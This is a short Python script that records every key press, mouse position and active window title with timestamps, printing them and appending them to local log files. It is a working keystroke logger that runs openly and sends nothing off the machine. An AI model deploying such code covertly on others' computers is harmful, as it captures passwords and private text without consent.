import time
import threading
import keyboard
import pygetwindow as gw
import pyautogui

def log_mouse_position():
    last_x, last_y = -1, -1
    while True:
        x, y = pyautogui.position()
        if x != last_x or y != last_y:
            last_x, last_y = x, y
            log = f'[{time.strftime("%Y-%m-%d %H:%M:%S")}] X: {x}, Y: {y}'
            print(log)
            with open('MouseLog.txt', 'a') as f:
                f.write(log + '\n')
        time.sleep(0.1)

def log_active_window():
    last_window_title = ""
    while True:
        try:
            window = gw.getActiveWindow()
            if window.title != last_window_title:
                last_window_title = window.title
                log = f'[{time.strftime("%Y-%m-%d %H:%M:%S")}] {last_window_title}'
                print(log)
                with open('WindowLog.txt', 'a') as f:
                    f.write(log + '\n')
        except Exception as e:
            pass
        time.sleep(0.5)

def log_key_pressed(e):
    log = f'[{time.strftime("%Y-%m-%d %H:%M:%S")}] {e.name}'
    print(log)
    with open('KeyboardLog.txt', 'a') as f:
        f.write(log + '\n')

if __name__ == "__main__":
    print("Monitoring mouse and keyboard events...")
    threading.Thread(target=log_mouse_position).start()
    threading.Thread(target=log_active_window).start()
    keyboard.on_press(log_key_pressed)
    keyboard.wait()
